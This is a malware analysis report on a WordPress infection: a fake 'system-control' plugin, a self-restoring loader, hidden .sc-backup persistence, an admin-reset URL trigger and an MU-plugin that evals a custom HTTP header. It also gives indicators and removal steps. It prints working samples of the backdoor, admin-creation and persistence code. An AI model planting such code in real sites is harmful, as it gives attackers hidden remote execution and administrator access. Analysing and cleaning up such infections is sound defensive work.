---
title: "WordPress fake system-control plugin and MU-plugin backdoor"
slug: "wordpress-fake-system-control-plugin-mu-plugin-backdoor"
description: "Evidence-backed WordPress malware pattern involving a fake system-control plugin, self-restoring loader, hidden .sc-backup persistence, MU-plugin eval backdoor, unauthorized admin reset trigger, and spam popup behavior."
reportDate: "2026-04-22"
reportType: "Threat Pattern"
threatType: "Backdoor with persistence, unauthorized admin creation, and spam/redirect monetization"
severity: "Critical"
sampleScope: "Representative malware samples from a larger infected WordPress site. Evidence indicates broader compromise across theme, plugins, mu-plugins, and hidden backup paths rather than a single isolated file."
fileHash: "c19604246e220a59f972abba125d30e4a7285591526e1885250fcfc49cf233ef"
detectedPaths: ["functions.php","sc-loader.php","site-compat-layer.php","test-mu-plugin.php","system-control.php","WordPressSecureMode.php"]
screenshots: ["/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-1.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-2.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-3.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-4.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-5.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-6.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-7.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-8.png","/images/wordpress-threats/malware-inside-mu-plugins-themes-plugins_evidence-9.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Not found / unique sample"
affectedComponents: ["Active theme functions.php","wp-content/plugins/system-control","wp-content/.sc-backup/system-control","wp-content/.sc-backup","mu-plugins / must-use plugin loading path","WordPress administrator accounts","Potentially additional malicious plugin directories such as wp-content/plugins/seo-1775448316","Potentially additional malicious theme directories with generated names under wp-content/themes"]
entryPoints: ["HTTP request parameters consumed by the obfuscated functions.php backdoor","HTTP GET trigger compat=verify used by site-compat-layer.php","Custom HTTP header HTTP_D44B195 consumed by the MU-plugin eval backdoor","system-control REST API namespace system-control/v1","Reactivation/restoration through WordPress plugin load lifecycle via plugins_loaded"]
persistencePoints: ["Injected code inside the active theme functions.php","Must-use plugin file test-mu-plugin.php","Persistence loader file sc-loader.php","Fake plugin directory wp-content/plugins/system-control","Hidden backup directory wp-content/.sc-backup/system-control","Unauthorized administrator account creation/reset logic in site-compat-layer.php","Potential additional fake plugin/theme directories with generated names"]
---

## Quick Answer
If you are seeing a system-control plugin, a hidden wp-content/.sc-backup directory, unexplained admin account changes, fake CAPTCHA or casino spam overlays, or odd MU-plugin files, treat the site as fully compromised. The representative samples support a high-confidence finding of a multi-part WordPress backdoor and persistence infection, not a harmless plugin conflict.

## What This Threat Pattern Is
This is a multi-component WordPress malware pattern built for attacker access, persistence, and monetization. The representative infected functions.php sample contains heavily obfuscated request-driven backdoor logic. A separate loader file restores a fake plugin called system-control from a hidden backup path and re-activates it if removed. Another file creates or resets an administrator account when a simple URL trigger is hit. A representative mu-plugin sample executes arbitrary PHP from a custom HTTP header. Taken together, these samples show a backdoor set designed to survive partial cleanup and keep attacker access even if one component is found first.

## What Visitors May See
- Casino spam popups or bonus offers on the frontend
- Fake “I’m not a robot” or reCAPTCHA-style overlays
- Spam redirects or deceptive interstitial pages
- Injected SEO or doorway-style pages from suspicious theme or plugin folders
- Intermittent behavior where the site looks normal to some visitors and malicious to others

## Screenshot-Based Symptoms
The uploaded screenshots show both filesystem and frontend symptoms. On the filesystem side, there is a hidden wp-content/.sc-backup directory containing a system-control folder, plus a wp-content/plugins/system-control directory and another suspicious plugin-like folder named seo-1775448316. The wp-content/themes view also shows many generated directory names such as author-template-1775540802, category_template_1774883751, custom-file-1-1775828015, error_404_1775568333, home_1774883621, page_template_1776152091, top_1775448331, and widget_area_1774883683, which is not normal for a clean WordPress theme setup. On the frontend side, the screenshots show a large casino promotion popup with bonus language and promo code text, followed by a fake “I’m not a robot” overlay presented like reCAPTCHA. Those are visible visitor-facing symptoms consistent with spam or redirect monetization.

### Screenshot Findings
- **File manager view of wp-content/.sc-backup showing a hidden backup directory with a system-control subfolder.** — This screenshot shows a hidden backup-style directory under wp-content that matches the loader's restoration path and supports persistence.
- **File manager view of wp-content with a hidden .sc-backup folder highlighted.** — This is a visible indicator of hidden persistence storage inside wp-content, which normal site owners may notice during cleanup.
- **Large casino popup saying SPECIAL BONUS, Visit our Casino and get $100 to $3,000, NO DEPOSIT BONUS, Promo Code GG26.** — This is a clear visitor-facing spam/casino monetization symptom associated with the infection.
- **Fake I'm not a robot reCAPTCHA-style overlay displayed over a blurred casino popup background.** — This indicates deceptive interstitial behavior layered on top of spam content, often used in redirect or social engineering campaigns.
- **File manager view of wp-content/plugins showing a suspicious system-control folder and another suspicious plugin-like folder named seo-1775448316.** — This supports the presence of a fake plugin and at least one additional suspicious plugin directory.
- **File manager view of wp-content/themes showing many suspicious generated directories such as author-template-1775540802, category_template_1774883751, custom-file-1-1775828015, error_404_1775568333, home_1774883621, page_template_1776152091, top_1775448331, and widget_area_1774883683.** — These generated theme-like directories strongly suggest dropped spam templates or malicious components beyond the single sampled theme file.

## Why This Usually Means the Site Is Compromised
This WordPress infection pattern is not a single bad file. The representative samples show a multi-part compromise spanning the active theme, normal plugins, must-use plugins, and a hidden backup folder used for restoration. In this case, the strongest confirmed signals are a fake plugin named system-control that restores and re-activates itself, a must-use plugin backdoor that executes attacker-supplied PHP from a custom header, and a trigger-based script that can create or reset an administrator account. The screenshots also show visible spam behavior on the frontend, including a casino promotion popup and a fake CAPTCHA overlay.

## Likely Root Cause
The original entry point is not proven by these samples alone. The evidence does support a broader compromise across multiple writable WordPress areas, which usually means the attacker already had enough access to modify theme files, add plugins, plant MU-plugins, and create hidden backup storage under wp-content. That level of spread is more important than guessing the first exploit, because removal will fail if you only delete one visible file.

## Why It Keeps Coming Back
It keeps coming back because the infection has more than one persistence layer. The loader sample checks for wp-content/plugins/system-control/system-control.php on every load and restores it from wp-content/.sc-backup/system-control if it is missing. The same loader also re-activates the plugin if it is present but inactive, and hides delete or deactivate actions in wp-admin. Separately, the MU-plugin sample gives the attacker direct code execution through a custom header, and the admin-reset file can recreate privileged access on demand. Even if one file is removed, the others can restore access or reinstall components.

## Files and Directories to Check
- Active theme functions.php and the rest of the active theme directory
- wp-content/plugins/system-control/
- wp-content/.sc-backup/
- wp-content/.sc-backup/system-control/
- The exact location of sc-loader.php
- The exact location of site-compat-layer.php
- wp-content/mu-plugins/ including test-mu-plugin.php
- WordPress administrator accounts, especially unexpected or recently changed admins
- wp-content/plugins/seo-1775448316 if present
- Suspicious generated directories under wp-content/themes such as author-template-*, category_template_*, custom-file-*, error_404_*, home_*, page_template_*, top_*, and widget_area_*

## Removal Targets Inferred From The Samples
- **theme_file:** `functions.php` — Representative infected active theme functions file containing an obfuscated backdoor/spam component. Replace with a clean vendor/original copy from the legitimate theme, and review the whole active theme for additional injected files.
- **plugin_file:** `sc-loader.php` — Persistence loader that restores and reactivates the malicious system-control plugin and resists deletion from wp-admin.
- **plugin_directory:** `wp-content/plugins/system-control` — Fake malicious plugin with remote-management, redirect, self-protect, admin-bypass, and file-management capabilities. Remove the entire component, not only the sampled main file.
- **hidden_backup_path:** `wp-content/.sc-backup` — Hidden persistence storage referenced by the loader and shown in screenshots; contains backup material used to restore the malicious plugin.
- **hidden_backup_path:** `.sc-backup/system-control` — Explicit restoration source for the fake system-control plugin.
- **plugin_file:** `site-compat-layer.php` — Unauthorized admin creation/reset trigger that provides attacker re-entry via compat=verify.
- **mu_plugin_path:** `test-mu-plugin.php` — Must-use plugin backdoor that evals attacker-supplied code from the HTTP_D44B195 header.
- **unauthorized_admin_review:** `WordPress administrator accounts` — The malware contains logic to create or reset an admin user named bennett and to grant administrator privileges. Review all admin users, remove unauthorized accounts, and rotate credentials.
- **plugin_directory:** `wp-content/plugins/seo-1775448316` — Suspicious plugin-like directory shown in screenshots with generated naming consistent with malicious spam components. Review and likely remove as part of the larger infection set if not a verified legitimate plugin.
- **theme_directory:** `wp-content/themes/author-template-1775540802` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/category_template_1774883751` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/category_template_1775464359` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/custom_file_2_1776097215` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/custom-file-1-1775828015` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/custom-file-1-1775891203` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/error_404_1775568333` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/home_1774883621` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/page_template_1776152091` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/top_1775448331` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.
- **theme_directory:** `wp-content/themes/widget_area_1774883683` — Suspicious generated theme directory shown in screenshots, likely part of dropped spam/template payloads.

## Technical Analysis
The evidence supports a critical WordPress compromise with multiple independent access paths. The representative infected functions.php sample is heavily obfuscated and includes custom decoding logic, request parsing branches, file writing, mail sending, and process execution via popen or proc_open. It also suppresses errors, extends execution time, and ignores user aborts, which is typical of general-purpose backdoor or spam-sending code. The representative sc-loader.php sample is explicit persistence code: it hooks into plugins_loaded, checks for wp-content/plugins/system-control/system-control.php, restores the plugin from wp-content/.sc-backup/system-control if missing, and activates it with activate_plugin(). It also removes delete and deactivate actions for that plugin and blocks deletion attempts. The representative site-compat-layer.php sample runs on wp_loaded and, when compat=verify is supplied, creates or resets a WordPress administrator account and ensures administrator capability. The representative mu-plugin backdoor sample reads the HTTP_D44B195 header from $_SERVER and passes it to eval(), which is direct remote code execution. The representative system-control.php sample presents itself as a benign plugin but defines a remote panel URL, loads modules for admin bypass, file management, plugin blocking, self-protect logic, redirects, display links, and broad REST API endpoints for users, plugins, themes, files, database, content, sync, and settings. That combination is not normal maintenance tooling; it is consistent with attacker-controlled remote management and monetization infrastructure. The screenshots reinforce that this was not confined to one file: hidden backup storage exists, suspicious plugin and generated theme directories exist, and visitors were exposed to casino spam and fake CAPTCHA overlays.

## Attack Chain
1. Attacker gains enough access to write into theme, plugin, MU-plugin, and hidden wp-content paths.
2. Obfuscated code is placed into theme functions.php to provide request-driven backdoor or spam functionality.
3. A fake system-control plugin is installed under wp-content/plugins/system-control.
4. A loader file ensures the fake plugin is restored from wp-content/.sc-backup/system-control and re-activated if removed or disabled.
5. A separate trigger file allows the attacker to create or reset an administrator account using a simple URL parameter.
6. A MU-plugin backdoor provides arbitrary PHP execution through a custom HTTP header.
7. The broader plugin set appears to handle redirects, display links, bot filtering, file management, and remote administration, enabling spam or redirect monetization on the frontend.

## Evidence Notes
- Representative infected functions.php sample: SHA-256 c19604246e220a59f972abba125d30e4a7285591526e1885250fcfc49cf233ef.
- Representative sc-loader.php sample: SHA-256 c9275d633f09286fec0a44b86a4cb1f5e2ee30f35cdb2f2429ea3472d5832e05.
- Representative site-compat-layer.php sample: SHA-256 f3a125f6ff20cc5b7bfb1bd2454790e1ddb2b6a9b17a77685906791d14bbc11a.
- Representative MU-plugin backdoor sample test-mu-plugin.php: SHA-256 6eeb37c1dad22e8072333caf7bc0f914435c99b109c6c36b113cc32fd87601b8.
- Representative fake plugin main file system-control.php: SHA-256 087ffe95cccaf053b00164570ad2443bbc00e2fa07416fb00c29ab11db2e30a9.
- Representative auxiliary file WordPressSecureMode.php: SHA-256 dfb5fe7e741d31e258c81b9a6088f77be78a8e53e7c67f5ff27751fc6d2d1027.
- Public IOC: hidden path wp-content/.sc-backup/system-control referenced by loader code and shown in screenshots.
- Public IOC: REST namespace system-control/v1 defined in the representative fake plugin sample.
- Public IOC: custom header HTTP_D44B195 used by the representative MU-plugin backdoor.
- Public IOC: query trigger compat=verify used by the representative admin-reset file.
- Public IOC: username bennett appears in the representative admin-reset sample, but usernames alone should not be used as sole proof of compromise.
- Public IOC: domain fuckingpanel[.]com appears as the panel URL in the representative fake plugin sample.

## Representative Malware Samples
### FILE: `sc-loader.php`
**Why it matters:** Self-restoring persistence loader that recreates and reactivates the fake plugin from a hidden backup directory and interferes with admin removal.

```php
add_action('plugins_loaded', function() {
    $plugin_dir = WP_PLUGIN_DIR . '/system-control';
    $main_file  = $plugin_dir . '/system-control.php';
    $backup_dir = WP_CONTENT_DIR . '/.sc-backup/system-control';

    if ((!is_dir($plugin_dir) || !is_file($main_file)) && is_dir($backup_dir)) {
        sc_loader_copy_dir($backup_dir, $plugin_dir);
        include_once ABSPATH . 'wp-admin/includes/plugin.php';
        activate_plugin('system-control/system-control.php');
    }

    if (is_file($main_file)) {
        include_once ABSPATH . 'wp-admin/includes/plugin.php';
        if (function_exists('is_plugin_active') && !is_plugin_active('system-control/system-control.php')) {
            activate_plugin('system-control/system-control.php');
        }
    }
}, 1);
```

### FILE: `site-compat-layer.php`
**Why it matters:** Trigger-based unauthorized admin creation/reset logic that grants or restores administrator access when compat=verify is requested.

```php
add_action('wp_loaded', 'site_compatibility', 9999);

function site_compatibility() {
    if (!isset($_GET['compat']) || $_GET['compat'] !== 'verify') {
        return;
    }

    $username = 'bennett';
    $password = '[REDACTED]';

    $exists = username_exists($username);
    $user = $exists ? get_user_by('login', $username) : false;

    if (!$user || !is_object($user)) {
        $uid = wp_create_user($username, $password, $email);
        $user_obj = new WP_User($uid);
        $user_obj->set_role('administrator');
    } else {
        if (!wp_check_password($password, $user->user_pass, $user->ID)) {
            wp_set_password($password, $user->ID);
        }
        if (!$user->has_cap('administrator')) {
            $user->add_cap('administrator');
        }
    }
}
```

### FILE: `test-mu-plugin.php`
**Why it matters:** Minimal MU-plugin backdoor that executes arbitrary PHP from a custom HTTP header.

```php
$body_class_yc = $_SERVER;
$body_class_omo = 'HTTP_D44B195';
$body_class_be = isset($body_class_yc[$body_class_omo]);
if ($body_class_be) {
    $body_class_yv = $body_class_yc[$body_class_omo];
    eval($body_class_yv);
}
```

### FILE: `system-control.php`
**Why it matters:** Main fake plugin file showing remote panel linkage, broad modular capabilities, and attacker-controlled REST namespace.

```php
define( 'SC_PANEL_URL', 'hxxps://fuckingpanel[.]com' );
define( 'SC_PANEL_SECRET', '[REDACTED]' );
define( 'SC_REST_NAMESPACE', 'system-control/v1' );

require_once SC_PLUGIN_DIR . 'includes/class-sc-admin-bypass.php';
require_once SC_PLUGIN_DIR . 'includes/class-sc-filemanager.php';
require_once SC_PLUGIN_DIR . 'includes/class-sc-plugin-blocker.php';
require_once SC_PLUGIN_DIR . 'includes/class-sc-self-protect.php';
require_once SC_PLUGIN_DIR . 'includes/class-sc-redirect-handler.php';
require_once SC_PLUGIN_DIR . 'includes/class-sc-display-links.php';

require_once SC_PLUGIN_DIR . 'api/endpoints/class-sc-users-endpoint.php';
require_once SC_PLUGIN_DIR . 'api/endpoints/class-sc-plugins-endpoint.php';
require_once SC_PLUGIN_DIR . 'api/endpoints/class-sc-themes-endpoint.php';
require_once SC_PLUGIN_DIR . 'api/endpoints/class-sc-files-endpoint.php';
require_once SC_PLUGIN_DIR . 'api/endpoints/class-sc-database-endpoint.php';
```

### FILE: `functions.php`
**Why it matters:** Obfuscated theme injection with request-driven behavior and system command execution support, consistent with a general-purpose backdoor/spam component.

```php
function __construct()
{
    @set_time_limit(300);
    @ignore_user_abort(true);
    if (empty($_REQUEST)) {
        die;
    }
}

private function _ys($_du, $_cs, $_kle, $_ov, $_cal, $_ems = "")
{
    if (@mail($_kle, $_ov, $_cal, $_ems)) {
        return true;
    }
}

private function _bhj($_jv, $_bnc, $_mti, $_exo)
{
    if ($_mti) {
        $_cxt = @popen($_jv, 'w');
        @fputs($_cxt, $_bnc . $this->_kp);
        return @pclose($_cxt);
    } elseif ($_exo) {
        $_iyk = @proc_open($_jv, $_zn, $_lpp);
        @fputs($_lpp[0], $_bnc . $this->_kp);
        return @proc_close($_iyk);
    }
}
```

## Indicators of Compromise (Public-Safe)
- `c19604246e220a59f972abba125d30e4a7285591526e1885250fcfc49cf233ef`
- `c9275d633f09286fec0a44b86a4cb1f5e2ee30f35cdb2f2429ea3472d5832e05`
- `f3a125f6ff20cc5b7bfb1bd2454790e1ddb2b6a9b17a77685906791d14bbc11a`
- `6eeb37c1dad22e8072333caf7bc0f914435c99b109c6c36b113cc32fd87601b8`
- `087ffe95cccaf053b00164570ad2443bbc00e2fa07416fb00c29ab11db2e30a9`
- `dfb5fe7e741d31e258c81b9a6088f77be78a8e53e7c67f5ff27751fc6d2d1027`
- `fuckingpanel[.]com`
- `wp-content/plugins/system-control/system-control[.]php`
- `wp-content/[.]sc-backup/system-control`
- `system-control/v1`
- `HTTP_D44B195`
- `compat=verify`
- `bennett`

## Removal Strategy
Remove this as a coordinated infection, not as isolated files. If you only delete the visible fake plugin, the hidden backup or MU-plugin backdoor can restore it. If you only remove the admin user, the trigger file can recreate it. Work from a known-good backup of the site files if available, or replace compromised components with clean originals from trusted sources.

## Manual Removal Protocol
1. Take the site offline or place it behind maintenance protection before cleanup so the attacker cannot continue using the backdoors during remediation.
2. Make a full forensic backup of files and database before changing anything.
3. Delete the persistence loader file sc-loader.php from its actual on-disk location after confirming it is not part of legitimate site code.
4. Delete the entire wp-content/plugins/system-control directory, not just system-control.php.
5. Delete the hidden backup storage at wp-content/.sc-backup and verify that wp-content/.sc-backup/system-control is gone.
6. Delete the representative MU-plugin backdoor test-mu-plugin.php and inspect the entire mu-plugins directory for any other unexpected files.
7. Remove site-compat-layer.php from its actual on-disk location after confirming it is not legitimate, because it contains unauthorized administrator creation and password reset logic.
8. Replace the infected theme functions.php with a clean vendor or trusted original copy, and review the whole active theme for other injected PHP files.
9. Review suspicious plugin and theme directories shown in the screenshots, including seo-1775448316 and the generated theme-like directories, and remove any that are not verified legitimate site assets.
10. Audit WordPress users and remove any unauthorized administrators. Review not only usernames but also capability changes and recently modified accounts.
11. Rotate all WordPress admin passwords, hosting panel passwords, SFTP/SSH credentials, and database credentials after file cleanup.
12. Force logout all users and invalidate active sessions where possible.
13. Reinstall WordPress core from a trusted source and replace all plugins and themes with clean copies from official or verified vendors.
14. Scan the database for injected options, rogue scheduled tasks, hidden admin settings, spam posts, doorway pages, and malware references to system-control, compat=verify, or related artifacts.
15. Check wp-config.php, .htaccess, server-level startup files, and cron jobs for added persistence.
16. After cleanup, monitor the filesystem for recreation of system-control, .sc-backup, or unknown MU-plugin files.

## Hardening Checklist
- Disable file editing in WordPress and restrict who can write to wp-content.
- Keep WordPress core, themes, and plugins updated from trusted sources only.
- Remove unused themes and plugins so attackers have fewer places to hide.
- Use file integrity monitoring on wp-content, mu-plugins, and wp-admin/plugin activation events.
- Review administrator accounts regularly and alert on new admin creation.
- Restrict access to hosting, SFTP, SSH, and database tools with strong unique passwords and MFA.
- Harden PHP execution so uploads and non-code directories cannot run arbitrary PHP where not needed.
- Log and review unusual headers, especially custom headers being sent to WordPress, because header-based backdoors can bypass normal URL-based detection.
- Monitor for hidden directories under wp-content such as dot-prefixed backup folders.
- Use a web application firewall and server-side malware scanning, but do not rely on either as the only cleanup step.

## FAQ
### Is the system-control plugin legitimate?
Based on the representative samples, no. The plugin family shown here restores itself from a hidden backup, re-activates itself, blocks deletion, exposes attacker-style management endpoints, and is tied to admin bypass, file management, redirect, and self-protect functionality. Those are malicious behaviors, not normal WordPress maintenance features.

### Why does the malware return after I delete the plugin?
Because the plugin is only one part of the infection. The loader restores it from wp-content/.sc-backup, the MU-plugin provides separate code execution, and the admin-reset script can restore attacker access. Partial cleanup is why this pattern often reappears.

### What is the most dangerous file in this set?
There is no single safe choice to leave behind. The MU-plugin eval backdoor is especially dangerous because it can execute arbitrary PHP from a request header, but the loader and admin-reset file are also critical because they preserve persistence and account access.

### Could the weird theme folders be harmless leftovers?
Some odd folders can be harmless in other contexts, but in this case they appear alongside confirmed malicious components, hidden backup storage, and visible spam behavior. They should be treated as suspicious until verified against a known-good site build.

### Does this prove the exact original hack entry point?
No. The samples strongly prove compromise, persistence, and malicious behavior, but they do not by themselves prove the first vulnerability or credential used to get in.

### Should I just remove the unauthorized admin account and keep the rest?
No. If you only remove the account, the trigger-based admin-reset logic or the other backdoors can recreate access. You must remove the file-based persistence as well.

### Do I need to reinstall WordPress core, themes, and plugins?
In most cases, yes. When malware has spread across theme files, plugins, MU-plugins, and hidden backup directories, replacing code with clean trusted originals is safer than trying to hand-edit every file.

> **Proof statement:** This page is based on representative malware samples and screenshots collected during real WordPress cleanup work by MD Pabel. The findings are stated from the provided code and visible artifacts: a self-restoring fake system-control plugin, hidden .sc-backup persistence, a trigger-based unauthorized admin reset file, a header-driven MU-plugin eval backdoor, and visitor-facing spam/fake CAPTCHA symptoms.
>
> **Confidence:** Root cause low, persistence high, screenshot read high, IOCs high.
